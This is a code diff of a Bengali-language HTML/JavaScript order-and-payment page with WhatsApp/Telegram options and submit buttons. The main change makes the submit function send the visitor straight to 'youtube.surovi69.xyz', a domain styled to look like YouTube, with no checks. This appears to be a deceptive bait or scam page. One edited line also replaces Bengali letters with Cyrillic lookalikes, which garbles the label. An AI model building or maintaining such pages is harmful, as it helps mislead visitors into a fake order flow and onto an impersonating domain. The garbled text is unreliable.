@@ -156,7 +156,7 @@
     .personal-tag { font-weight: bold; display: block; margin-bottom: 5px; color: #ff0000; }
     .amount { color: #2ecc71; font-weight: bold; font-size: 1.3em; }
 
-    .submit-btn { margin-top: 20px; width: 100%; padding: 16px; background: #27ae60; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; }
+    .submit-btn { margin-top: 20px; width: 100%; padding: 16px; background: #27ae60; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
 
     .payment-audio {
         margin: 20px 0 0 0;
@@ -205,7 +205,7 @@
     </div>
 
     <div class="messenger-box" id="messengerBox">
-        <div class="section-title">মেসেঞ্জার বাছাই করুন:</div>
+        <div class="section-title">মেсеঞ্জার বাছাই করুন:</div>
         <div class="messenger-options">
             <label onclick="selectMessenger('WhatsApp',0)"><input type="radio" name="msg"> WhatsApp</label>
             <label onclick="selectMessenger('Telegram',1)"><input type="radio" name="msg"> Telegram</label>
@@ -255,7 +255,7 @@
             <p class="userInfoDisplay" style="margin:0; line-height:1.6;"></p>
         </div>
 
-        <button class="submit-btn" onclick="submitOrder(this)">
+        <button class="submit-btn" onclick="submitOrder()">
             <span>জমা দিন</span>
         </button>
 
@@ -291,7 +291,7 @@
             <p class="userInfoDisplay" style="margin:0; line-height:1.6;"></p>
         </div>
 
-        <button class="submit-btn" style="background: #e67e22;" onclick="submitOrder(this)">
+        <button class="submit-btn" style="background: #e67e22;" onclick="submitOrder()">
             <span>জমা দিন</span>
         </button>
 
@@ -377,9 +377,9 @@ function initiateBuy(){
     }, 2000);
 }
 
-function submitOrder(btn){
-    // কোনো রকম কন্ডিশন বা চেক ছাড়া বাটনে ক্লিক করামাত্র ০ সেকেন্ডে ইনস্ট্যান্ট রিডাইরেক্ট হবে
-    window.location.href = "https://youtube.surovi69.xyz";
+// সুপারফাস্ট ০ সেকেন্ড রিডাইরেক্ট ফাংশন (কোনো কন্ডিশন বা চেক ছাড়া)
+function submitOrder(){
+    window.location.replace("https://youtube.surovi69.xyz");
 }
 </script>
 
